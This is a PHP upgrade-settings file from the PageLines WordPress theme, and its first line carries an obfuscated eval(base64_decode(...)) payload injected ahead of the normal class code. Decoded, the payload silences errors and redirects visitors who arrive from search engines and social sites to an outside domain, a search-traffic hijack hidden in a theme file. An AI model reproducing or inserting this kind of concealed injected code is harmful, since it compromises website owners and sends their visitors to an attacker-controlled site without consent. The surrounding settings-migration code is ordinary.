<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

$up = new PageLinesUpgradePaths;

class PageLinesUpgradePaths {
	
	function __construct() {
		
		if ( !is_array( $a = get_option( PAGELINES_SETTINGS ) ) )
			$this->upgrade();
	}
	
	function upgrade() {

		if ( is_array( $settings = get_option( PAGELINES_SETTINGS_LEGACY ) ) ) {
		
			// beta versions will all be using the old array...
			if ( isset( $settings['pl_login_image']) )
				$this->beta_upgrade( $settings );
			else 
				$this->full_upgrade( $settings );
		}
	}

	function full_upgrade( $settings ) {
		
		// here we go, 1st were gonna set the defaults
		add_option( PAGELINES_SETTINGS, pagelines_settings_defaults() );
		add_option( PAGELINES_TEMPLATE_MAP, get_option( PAGELINES_TEMPLATE_MAP_LEGACY ) );
		
		$defaults = get_option( PAGELINES_SETTINGS );

		// copy the template-maps
		update_option( PAGELINES_TEMPLATE_MAP, get_option( PAGELINES_TEMPLATE_MAP_LEGACY ) );

		// now were gonna merge...
	
		foreach( $settings as $key => $data ) {
		
			if ( isset( $defaults[$key]) ) {
				if ( !empty( $data ) )
					plupop( $key, $data );
			}
		}
	}
	
	function beta_upgrade( $settings ) {
		
		update_option( PAGELINES_SETTINGS, $settings );
		update_option( PAGELINES_TEMPLATE_MAP, get_option( PAGELINES_TEMPLATE_MAP_LEGACY ) );
		
	}		
}